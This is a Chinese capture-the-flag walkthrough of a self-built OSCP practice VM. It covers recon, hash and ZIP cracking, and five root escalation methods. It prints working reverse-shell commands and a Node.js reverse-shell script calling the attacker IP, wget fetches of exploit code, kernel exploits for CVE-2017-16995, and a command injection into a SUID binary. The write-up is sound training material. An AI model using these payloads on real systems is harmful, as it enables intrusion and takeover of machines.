# 简介

该项目是作者精心制作的环境，目标是获取获得root权限并找到flag.txt文本信息，该项目作为OSCP考试培训必打的一个项目环境，该作者评定该环境为渗透中级水准难度。接下来不管是零基础学习渗透者，还是有些基础的渗透者，甚至是高水平的渗透人员读该的技巧和文章都能学习到一些红队知识。

该项目有始有终会用到 信息收集 -> WEB信息枚举 -> hash破解 -> 内网信息收集 ->
（五种方法）提权，最终拿到flag.txt的过程，那么在五大模块中用到了一些小技巧都会在文章中演示出来，希望大家能动手也来和我一起学习渗透。

请注意：

本文仅用于技术讨论与研究，对于所有笔记中复现的这些终端或者服务器，都是自行搭建的环境进行渗透的。我将使用Kali
Linux作为此次学习的攻击者机器。这里使用的技术仅用于学习教育目的，如果列出的技术用于其他任何目标，本站及作者概不负责。

# 一、信息收集

信息收集非常重要，有了信息才能知道下一步该如何进行，接下来将用nmap来演示信息收集：

## 1、nmap扫描存活IP

由于本项目环境是nat模式需要项目IP地址，扫描挖掘本地的IP地址信息：

![202209141348709.png](https://image.3001.net/images/20230503/1683088505_6451e479eaedc72d14b52.png!small)

本机kali为192.168.40.128

发现本kali ip为40段！用40段进行全网段扫描：

    
    
    nmap -sP 192.168.40.0/24

![202209141348711.png](https://image.3001.net/images/20230503/1683088506_6451e47ae0017e310f2a2.png!small)

发现项目IP地址： 192.168.40.132

## 2、nmap全端口服务枚举

进行namp端口服务枚举：

    
    
    nmap 192.168.40.132 -p- -A

![202209141348712.png](https://image.3001.net/images/20230503/1683088507_6451e47beb84d098297fb.png!small)

得到开放的端口信息：

    
    
    22/tcp   open  ssh    OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
    3000/tcp open  hadoop-datanode Apache Hadoop

开放了22端口和3000端口，3000端口显示apache服务，试着用浏览器访问一下目标靶机的3000端口，进行web页面信息收集！

# 二、web信息枚举

## 1、web页面信息枚举

访问目标靶机的3000端口：

    
    
    http://192.168.40.132:3000/

![202209141348713.png](https://image.3001.net/images/20230503/1683088508_6451e47cebb90356da637.png!small)

访问进去右上角有ligon登录模块点击：

    
    
    http://192.168.40.132:3000/login

![202209141348714.png](https://image.3001.net/images/20230503/1683088510_6451e47e2507401e97736.png!small)

查看静态源码发现调用了javascript目录和js文件在前端！试着一个去访问看看有什么内容，

发现访问assets/js/app/controllers/home.js这个文件时，发现源码中有一个get请求:

    
    
    http://192.168.40.132:3000/assets/js/app/controllers/home.js

![202209141348715.png](https://image.3001.net/images/20230503/1683088511_6451e47f84881072b8712.png!small)

静态源码发现调用了：/api/users/

访问该目录文件：

    
    
    http://192.168.40.132:3000/api/users/

![202209141348716.png](https://image.3001.net/images/20230503/1683088512_6451e48048728bf32d1b3.png!small)

发现这是前端的JSON！包含四个用户名密码信息：

    
    
    myP14ceAdm1nAcc0uNT
    dffc504aa55359b9265cbebe1e4032fe600b64475ae3fd29c07d23223334d0af
    tom
    f0e2e750791171b0391b682ec35835bd6a5c3f7c8d1d0191451ec77b4d75f240
    mark
    de5a1adf4fedcce1533915edc60177547f1057b61b7119fd130e1f7428705f73
    rastating
    5065db2df0d4ee53562c650c29bacf55b97e231e3fe88570abc9edd8b78ac2f0

hash枚举发现：

    
    
    hash-identifier

![202209141348717.png](https://image.3001.net/images/20230503/1683088513_6451e481e355f6d08eed7.png!small)

这是256的密码值！

## 2、hash破解

在线解密：

    
    
    https://crackstation.net/

![202209141348718.png](https://image.3001.net/images/20230503/1683088514_6451e482cb8dc35e70818.png!small)

获得三个正确密码信息：

    
    
    myP14ceAdm1nAcc0uNT
    manchester
    
    tom
    spongebob
    
    mark
    snowflake

tom和mark都是普通用户，没有权限访问，myP14ceAdm1nAcc0uNT提示是管理员用户

尝试登录后台：

    
    
    http://192.168.253.176:3000/login
    myP14ceAdm1nAcc0uNT
    manchester

![202209141348719.png](https://image.3001.net/images/20230503/1683088516_6451e48409df4cf780eb8.png!small)

登录进去下载了文件：myplace.backup

查看一下文件内容

![202209141348720.png](https://image.3001.net/images/20230503/1683088517_6451e4851649c50ad6781.png!small)

很显然的看出为base64加密

下载下来分析！

![202209141348721.png](https://image.3001.net/images/20230503/1683088518_6451e486a403b90cbf12e.png!small)

## 3、base64解码

使用base64进行解密并查看解密后的文件类型：

    
    
    cat myplace.backup | base64 -d > test
    file test

![202209141348722.png](https://image.3001.net/images/20230503/1683088519_6451e4877a5b25a3be527.png!small)

可看到文件类型为ZIP，zip类型的文件继续爆破！

## 3、zip爆破

将后缀改为ZIP的格式：

    
    
    mv test test.zip

![202209141348723.png](https://image.3001.net/images/20230503/1683088520_6451e488224a57bd474e7.png!small)

然后进行解压：

    
    
    unzip test.zip

![202209141348724.png](https://image.3001.net/images/20230503/1683088520_6451e488be698a85116c9.png!small)

发现解压需要密码，那就使用fcrackzip进行爆破：

    
    
    fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt test.zip
    -D	指定方式为字典猜解
    -p	指定猜解字典的路径
    -u	表示只显示破解出来的密码，其他错误的密码不显示出

![202209141348725.png](https://image.3001.net/images/20230503/1683088521_6451e48975e4cbb2738e3.png!small)

PASSWORD FOUND!!!!: pw == magicword

成功获得密码！

解压登录

    
    
    unzip test.zip
    magicword

![202209141348726.png](https://image.3001.net/images/20230503/1683088522_6451e48a2a251de9a7eb3.png!small)

发现解压后有一个var目录，顺着这个目录往下面走，来到var/www/myplace这个目录，发现在这个目录下面有一个app.js的文件：

    
    
    cd var/www/myplace

![202209141348727.png](https://image.3001.net/images/20230503/1683088523_6451e48b4bddc9712fe9b.png!small)

发现这是www站目录源码信息泄露，存在app.js！

## 4、源码审计

App.js 是一个轻量级的 JavaScript UI 库，用来创建移动的 Web
应用，应用的外观跟原生的应用相同，性能也近乎一致。<https://www.runoob.com/nodejs/nodejs-mongodb.html>  

查看其内容

    
    
    gedit app.js

![202209141348728.png](https://image.3001.net/images/20230503/1683088524_6451e48c6ccd2f47661b7.png!small)

获取到了mongodb信息！！

    
    
    const express     = require('express');
    const session     = require('express-session');
    const bodyParser  = require('body-parser');
    const crypto      = require('crypto');
    const MongoClient = require('mongodb').MongoClient;
    const ObjectID    = require('mongodb').ObjectID;
    const path        = require("path");
    const spawn        = require('child_process').spawn;
    const app         = express();
    const url         = 'mongodb://mark:5AYRft73VtFpc84k@localhost:27017/myplace?authMechanism=DEFAULT&authSource=myplace';
    const backup_key  = '45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474';

mark:5AYRft73VtFpc84k，发现这个账号密码可能为ssh远程登入账号密码

# 三、内部信息枚举

## 1、SSH登录

尝试使用账户密码登录：

    
    
    ssh mark@192.168.40.132
    5AYRft73VtFpc84k

![202209141348729.png](https://image.3001.net/images/20230503/1683088525_6451e48d85f4f476b1df2.png!small)

成功登录！！

## 2、linpeas脚本扫描

开启http服务上传脚本，并执行：

    
    
    python -m SimpleHTTPServer 8081
    wget http://192.168.40.128:8081/linpeas.sh
    chmod +x linpeas.sh
    ./linpeas.sh

![202209141348730.png](https://image.3001.net/images/20230503/1683088526_6451e48e7fac0c08a3621.png!small)

![202209141348731.png](https://image.3001.net/images/20230503/1683088527_6451e48f422c1b113895b.png!small)

## 3、内部信息收集

1）版本信息

    
    
    Linux version 4.4.0-93-generic
    Sudo version 1.8.16

![202209141348732.png](https://image.3001.net/images/20230503/1683088528_6451e4902a84501d73c8d.png!small)

2）开启了mongodb 服务

    
    
    127.0.0.1:27017

![202209141348733.png](https://image.3001.net/images/20230503/1683088528_6451e490e689b3c188e21.png!small)

3）新用户

    
    
    uid=1000(tom) gid=1000(tom) groups=1000(tom),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare),1002(admin)

![202209141348734.png](https://image.3001.net/images/20230503/1683088529_6451e4919311165b42ad2.png!small)

5）漏洞利用

    
    
    CVE-2017-16995

![202209141348735.png](https://image.3001.net/images/20230503/1683088530_6451e4928cbfc44cb052c.png!small)

# 四、提权

## 1、内核提权

查找版本可利用漏洞：

    
    
    searchsploit Linux 4.4.0

![202209141348736.png](https://image.3001.net/images/20230503/1683088531_6451e49365cb81104c816.png!small)

发现Linux Kernel < 4.4.0-116 44298.c 可利用漏洞

将44298.c下载至本地：

    
    
    locate linux/local/44298.c
    cp /usr/share/exploitdb/exploits/linux/local/44298.c .

![202209141348737.png](https://image.3001.net/images/20230503/1683088533_6451e49527a31d627cc2c.png!small)

本地开启http服务将44298.c脚本上传至靶机，编译赋权并执行：

    
    
    python -m SimpleHTTPServer 8081
    wget http://192.168.40.128:8081/44298.c
    gcc 44298.c -o test                 #gcc编译EXP
    chmod +x test                       #赋权
    ./test

![202209141348738.png](https://image.3001.net/images/20230503/1683088534_6451e496162f71d1954cd.png!small)

成功获得root权限！

切换至其root目录，成功获得flag

    
    
    cd /root
    ls 
    cat root.txt

![202209141348739.png](https://image.3001.net/images/20230503/1683088534_6451e496db806cc02d3a0.png!small)

## 2、Mongodb提权

<https://www.runoob.com/mongodb/mongodb-connections.html>  

查看root权限用户

    
    
    ps aux | grep -v root
    -v  ---查看不匹配的行

![202209141348740.png](https://image.3001.net/images/20230503/1683088535_6451e4979ecf987cb7777.png!small)

看到/var/scheduler/app.js的tom用户下运行的调度程序应用程序

开启监听

    
    
    nc -vlp 4444

![202209141348741.png](https://image.3001.net/images/20230503/1683088536_6451e498c9d049919a580.png!small)

查看库信息

    
    
    mongo -u mark -p 5AYRft73VtFpc84k scheduler

![202209141348742.png](https://image.3001.net/images/20230503/1683088537_6451e49976d6d95fb1dcb.png!small)

写入一句话反弹shell

    
    
    show collections       ----show tables;查看已存在的表
    db.tasks.find({})     ----查看一下表内容,现在表中无文档
    db.tasks.insert({cmd: "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.40.128 4444 >/tmp/f"})   ----利用nc一句话反弹shell插入文档

![202209141348743.png](https://image.3001.net/images/20230503/1683088538_6451e49a3b87682fba105.png!small)

成功获得tom用户的反弹shell!

## 3、app.js提权

还有别的方法在JavaScript中创建一个反向shell

编写js木马：

    
    
    gedit shell.js
    
    写入js木马：
    (function(){
    var net = require("net"),
    cp = require("child_process"),
    sh = cp.spawn("/bin/sh", []);
    var client = new net.Socket();
    client.connect(1234, "192.168.40.128", function(){
    client.pipe(sh.stdin);
    sh.stdout.pipe(client);
    sh.stderr.pipe(client);
    });
    return /a/; // Prevents the Node.js application form crashing
    })();

![202209141348744.png](https://image.3001.net/images/20230503/1683088539_6451e49b05e1364819d0d.png!small)

上传木马

    
    
    wget http://192.168.40.128:8081/shell.js

![202209141348745.png](https://image.3001.net/images/20230503/1683088539_6451e49be582087801bfe.png!small)

开启监听

    
    
    nc -vlp 1234

![202209141348746.png](https://image.3001.net/images/20230503/1683088540_6451e49c9cecf8aaf4edd.png!small)

登录数据库，执行木马：

    
    
    mongo -u mark -p 5AYRft73VtFpc84k scheduler
    show collections
    db.tasks.findOne()   查看表内信息
    db.tasks.insert({"cmd": "/usr/bin/node /tmp/shell.js"})

![202209141348747.png](https://image.3001.net/images/20230503/1683088541_6451e49d45bcf71250159.png!small)

成功获得反弹shell！

## 4、命令注入

搜索下高权限程序：

    
    
    find / -perm -4000 2>/dev/null

![202209141348748.png](https://image.3001.net/images/20230503/1683088542_6451e49e1a63126a4bead.png!small)

发现存在 ：/usr/local/bin/backup

进入该目录查看

    
    
    cd /usr/local/bin/

![202209141348749.png](https://image.3001.net/images/20230503/1683088542_6451e49edb6c38d5cd933.png!small)

发现suid具有root权限

    
    
    -rwsr-xr--  1 root admin 16484 Sep  3  2017 backup

查看其文件类型

    
    
    file /usr/local/bin/backup

![202209141348750.png](https://image.3001.net/images/20230503/1683088543_6451e49f9d355e6ead4c6.png!small)

是个32位程序

将文件转换为base64编码：

    
    
    base64  /usr/local/bin/backup

![202209141348751.png](https://image.3001.net/images/20230503/1683088544_6451e4a060977feb01591.png!small)

将值复制至本地分析利用：

    
    
    vi base64.txt
    cat base64.txt | base64 -d > backup

![202209141348752.png](https://image.3001.net/images/20230503/1683088545_6451e4a13aefa19a1365e.png!small)

查看MD5值是否一致

    
    
    md5sum backup 
    md5sum /usr/local/bin/backup

![202209141348753.png](https://image.3001.net/images/20230503/1683088545_6451e4a1e051ea38aa02c.png!small)

值一致，说明传输无误。

利用strings 分析文件

    
    
    strings backup

![202209141348754.png](https://image.3001.net/images/20230503/1683088546_6451e4a2c0833dcee66f9.png!small)

![202209141348755.png](https://image.3001.net/images/20230503/1683088547_6451e4a374822d0ce14dc.png!small)

    
    
    /root
    /etc
    /tmp/.backup_%i
    /usr/bin/zip -r -P magicword %s %s > /dev/null    -----需要绕过/dev/null重定向
    /usr/bin/base64 -w0 %s
    The target path doesn't exist

  1. 它检查有效的访问令牌

  2. 对于位置/root和/etc，它具有硬编码的base64输出

  3. 如果位置不是/etc或/root，它将在/tmp文件夹中创建一个临时文件

  4. 然后使用以下命令压缩到特定位置。/usr/bin/zip -r -P magicword %s %s > /dev/null

可以从该命令的输出推断出，如果directory参数是/root或/etc，则返回上面的硬编码base64长字符串，否则，二进制文件将运行/usr/bin/zip
-r -P magicword %s %s > /dev/null！！！

  5. 然后将存档文件进行 base64 编码并打印到终端上！

目录这边可以用/etc/或者/root/，使用这两个目录才会产生base64字符串!

该字符串可以按照与之前的myplace.backup文件完全相同的方式进行解码和解压缩!

    
    
    /usr/local/bin/backup -q 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 /root/

![202209141348756.png](https://image.3001.net/images/20230503/1683088548_6451e4a486d68e6d28c09.png!small)

需要将字符串作为第三个参数传递给二进制可执行文件，该二进制可执行文件带有多个\n字符，以打印新行，然后当/bin/bash执行时，我们将具有root访问权限，因为二进制文件以root身份运行，添加了最终命令，使bash会话的输出不会重定向到/dev/null即可（使用换行符绕过
/dev/null)

    
    
    /usr/local/bin/backup -q 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 "$(echo '/any\n/bin/bash\nany')"

![202209141348757.png](https://image.3001.net/images/20230503/1683088549_6451e4a5d5d4b0b5da142.png!small)

注意：此命令在前面看到的python代码段创建的伪终端内不起作用的，必须首先通过在psuedo-terminal内键入exit或通过以用户tom身份重新连接而完全不运行python代码段来留下该伪终端，才可以执行成功！！

## 5、CVE-2017-16995

漏洞编号：CVE-2017-16995

漏洞详情：

该漏洞由Google project zero发现。该漏洞存在于带有 eBPF
bpf(2)系统（CONFIG_BPF_SYSCALL）编译支持的Linux内核中，是一个内存任意读写漏洞。该漏洞是由eBPF验证模块的计算错误产生的。普通用户可以构造特殊的BPF来触发该漏洞，此外恶意攻击者也可以使用该漏洞来进行本地提权操作。

本地编译exp

    
    
    locate 45010
    cp /usr/share/exploitdb/exploits/linux/local/45010.c .

![202209141348758.png](https://image.3001.net/images/20230503/1683088550_6451e4a6aebecc6788b8e.png!small)

上传至靶机，并编译执行：

    
    
    wget http://192.168.40.128:8081/45010.c
    gcc 45010.c -o cve-2017-16995
    chmod +x cve-2017-16995
    ./cve-2017-16995

![202209141348759.png](https://image.3001.net/images/20230503/1683088551_6451e4a7739a3619eac78.png!small)

上传执行成功！获得root权限！！

# 六、总结

通过以上的学习，我们认知了一些红队的小技巧的技术手段，完成了从信息收集到内核提权项目落地，学习到了非常多的技巧，例如
nmap端口信息枚举、Web页面信息枚举、hash破解、Zip爆破、linpeas.sh信息枚举、mongodb提权、app.js提权、命令注入等，希望伙伴们能实际操作复现一遍！来巩固自身的渗透技术和技巧！

希望大家提高安全意识，没有网络安全就没有国家安全！

作者：十七

